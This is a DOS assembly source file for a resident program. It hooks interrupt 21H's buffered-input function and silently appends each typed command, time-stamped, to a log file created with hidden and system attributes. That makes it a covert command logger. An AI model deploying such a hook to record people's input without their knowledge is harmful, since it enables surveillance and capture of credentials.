COMMENT	/*
	This file was written to keep a running log of DOS commands
	issued. It intercepts interrupt 21H function 0AH and grabs
	a copy of the buffered input string pointed to by DS:DX. The
	actual string is at DS:DX+2. DS:DX points to the maximum
	allowable characters to be accepted before signaling a beep,
	and simply waiting for a backspace or a carriage return. This
	value for DOS is typically 80H. The next byte DS:DX+1 contains
	the actual number of characters that were entered. Care must be
	taken not to disturb any data registers are segment registers,
	as DOS still has to act on that same string.

	IMPORTANT - Any program that intercepts INT 21H function 0AH
	prior to this program could render it useless. Such an example
	would be DOSKEY. It is recommended that an alternative program
	such as NDE.COM be used. It does lack some of the features that
	DOSKEY has, but it doesn't mess with INT 21H function 0AH.
	*/

PAGE	55,132				;set up page control for .lst file

.386					;turn on 386 instruction usage

ATTRIB		EQU	6H		;hidden and system
					;0 = normal
					;2 = hidden
					;4 = system
ACCESS		EQU	02H		;read/write and SHAREd

CREATE_FILE	EQU	5BH		;some useful DOS functions
OPEN_FILE	EQU	3DH
CLOSE_FILE	EQU	3EH
WRITE_FILE	EQU	40H
FILE_POINTER	EQU	42H

CODE_SEG	SEGMENT PARA 'CODE' PUBLIC USE16
		ASSUME	CS:CODE_SEG,DS:CODE_SEG,SS:CODE_SEG,ES:CODE_SEG

	ORG	0100H
BEGIN:	JMP	INIT
FILENAME	DB	'C:\LOG.DAT',0	;null terminated path and filename
                              ;this path:filename can be anything
HANDLE		DW	?
BAD_PATH	DB	'The path for the log file was not found.',0DH,0AH,'$'
NO_HANDLES	DB	'Insufficient FILE handles in config.sys.',0DH,0AH,'$'
ACCESS_DENIED	DB	'Access to the log file is denied!',0DH,0AH,'$'
UNKNOWN_ERR	DB	'An unknown error has occurred',0DH,0AH,'$'
DAY     DB  '['
        DW  ?   ;day
        DB  '/'
MONTH		DW	?		;month
        DB  '/'
YEAR    DW  ?   ;year
        DW  ?
        DB  ' - '
HOUR		DW	?		;hour
        DB  ':'
MINUTE  DW  ?   ;minute
        DB  ':'
SECOND  DW  ?   ;second
        DB  '] '
LINEFEED	DB	0DH,0AH
DX_STORAGE	DW	?		;temp storage for DX register
INPUT_LENGTH	DW	?		;length of input string storage
OLD_21H_OFF	DW	?		;far pointer to old int21 handler
OLD_21H_SEG	DW	?

int21	PROC	FAR
	CMP	AH,0AH			;is it buffered input function
	JNE	PASSIT			;no, pass it to old handler
	PUSHF				;yes, give it to the old handler 1st
	CALL	DWORD PTR CS:OLD_21H_OFF
	PUSHA				;save all registers used
	PUSH	ES			;save DOS's ES
	MOV	AX,DS			;save DOS's DS in ES
	MOV     ES,AX
	PUSHF				;save flags from INT 21H func 0AH

	;using DOS's DS here
	INC	DX			;DX points to the input length
	MOV	BX,DX
	MOV	AL,BYTE PTR [BX]	;get the input length
	CMP	AL,0			;was it a plain enter
	JE	SKIP			;yes, not interested in it
					;no, grab it
	;switching to TSR's DS
	MOV	CX,CS
	MOV	DS,CX
	MOVZX	CX,AL			;AL still has input length
	MOV	INPUT_LENGTH,CX		;save it for later
	INC	DX			;DX points to the input string
	MOV	DX_STORAGE,DX		;save DX pointing to input string

	;date and time stamp the input
	MOV	AH,2AH			;get the date
	INT	21H
	MOVZX	AX,DH			;get the day
	MOV	BL,0AH
	DIV	BL			;convert it to ASCII
	ADD	AX,3030H
	XCHG	AL,AL
	MOV	DAY,AX			;store it
	MOVZX	AX,DL			;get the month
	MOV	BL,0AH
	DIV	BL			;convert it to ASCII
	ADD	AX,3030H
	XCHG	AL,AL
	MOV	MONTH,AX		;store it

	MOV	AH,2CH			;get the time
	INT	21H
	MOVZX	AX,CH			;get the hour
	MOV	BL,0AH
	DIV	BL			;convert it to ASCII
	ADD	AX,3030H
	XCHG	AL,AL
	MOV	HOUR,AX			;store it
	MOVZX	AX,CL			;get the minute
	MOV	BL,0AH
	DIV	BL			;convert it to ASCII
	ADD	AX,3030H
	XCHG	AL,AL
	MOV	MINUTE,AX		;store it

	;open the file
	MOV	AL,ACCESS		;set the access rights to read/write
	LEA	DX,FILENAME		;DS:DX = pointer to filename
	MOV	AH,OPEN_FILE
	INT	21H
	JC	SKIP			;major error, file could have
					;been deleted
	MOV	HANDLE,AX		;otherwise get the handle

	;move the file pointer to end of the file
	MOV	BX,HANDLE
	MOV	AL,2			;file pointer based off of end
	MOV	CX,0			;0 displacement
	MOV	DX,0
	MOV	AH,FILE_POINTER
	INT	21H

	;write the date and time to the end of the file
	MOV	BX,HANDLE
  MOV CX,18H      ;number of chars to write
	LEA	DX,DAY			;DS:DX points to date and time stamp
	MOV	AH,WRITE_FILE
	INT	21H

	;write the collected data to the end of the file
	MOV	BX,HANDLE
	MOV	DX,DX_STORAGE		;DS:DX points to the string
	MOV	CX,INPUT_LENGTH		;get the number of chars to write
	MOV	AH,WRITE_FILE
	;switching to DOS's DS
	PUSH	ES			;must use PUSH's and POP's here
	POP	DS
	INT	21H

	;switching to TSR's DS
	MOV	AX,CS
	MOV	DS,AX
	;write the carriage return and linefeed to the end of the file
	MOV	BX,HANDLE
	MOV	CX,02H			;number of chars to write
	LEA	DX,LINEFEED		;DS:DX points to linefeed
	MOV	AH,WRITE_FILE
	INT	21H

	;close the file
	MOV	BX,HANDLE
	MOV	AH,CLOSE_FILE
	INT	21H

SKIP:	POPF				;reset flags from INT 21H func 0AH
	MOV	AX,ES			;get DOS's DS back from ES
	MOV	DS,AX
	POP	ES			;reset original ES
	POPA				;reset all registers used
	JMP	DONE
PASSIT:
	JMP	DWORD PTR CS:OLD_21H_OFF
DONE:	IRET
int21	ENDP

INIT:
	MOV	CX,ATTRIB		;set the attributes to normal file
	LEA	DX,FILENAME		;DS:DX = pointer to filename
	MOV	AH,CREATE_FILE		;DOS 3.0+ create a new file requests
	INT	21H
	JC	FILE_ERROR
	MOV	HANDLE,AX
	JMP	NO_FILE_ERROR
FILE_ERROR:
	CMP	AX,03H			;was the path bad?
	JNE	NEXT1			;no, check next possible error
	MOV	AH,09H			;yes, display the error
	LEA	DX,BAD_PATH
	INT	21H
	JMP	BYE			;and exit
NEXT1:	CMP	AX,04H			;were there enough handles
	JNE	NEXT2			;no, check next possible error
	MOV	AH,09H			;yes, display the error
	LEA	DX,NO_HANDLES
	INT	21H
	JMP	BYE			;and exit
NEXT2:	CMP	AX,05H			;was access to the file denied
	JNE	NEXT3			;no, check next possible error
	MOV	AH,09H			;yes, display the error
	LEA	DX,ACCESS_DENIED
	INT	21H
	JMP	BYE			;and exit
NEXT3:	CMP	AX,50H			;does the file exists already?
	JNE	UNKNOWN_ERROR		;no, an unknown error occurred
	JMP	NO_FILE_ERROR		;if file exists it is not an error
UNKNOWN_ERROR:
	MOV	AH,09H			;display unknown error
	LEA	DX,UNKNOWN_ERR
	INT	21H
	JMP	BYE			;and exit
NO_FILE_ERROR:
	MOV	AL,21H
	MOV	AH,35H			;read interrupt 21H's previous address
	INT	21H
	MOV	OLD_21H_SEG,ES		;and save the offset and segment
	MOV	OLD_21H_OFF,BX

	MOV	AL,21H			;put in the new handler's address
	MOV	AH,25H
	LEA	DX,int21		;DS:DX points to new routine
	INT	21H

	LEA	DX,INIT			;end of resident area
	MOV	CL,04H			;divide by 16
	SHR	DX,CL			;ro calculate no. of paragraphs
	INC	DX			;add 1 for saftey
	MOV	AL,0			;return code for DOS ERRORLEVEL
	MOV	AH,31H			;Terminate and Stay Resident
	INT	21H

BYE:	MOV	AL,1			;return code for DOS ERRORLEVEL
	MOV	AH,4CH			;properly exit to DOS 2.0+
	INT	21H
CODE_SEG	ENDS
	END	BEGIN
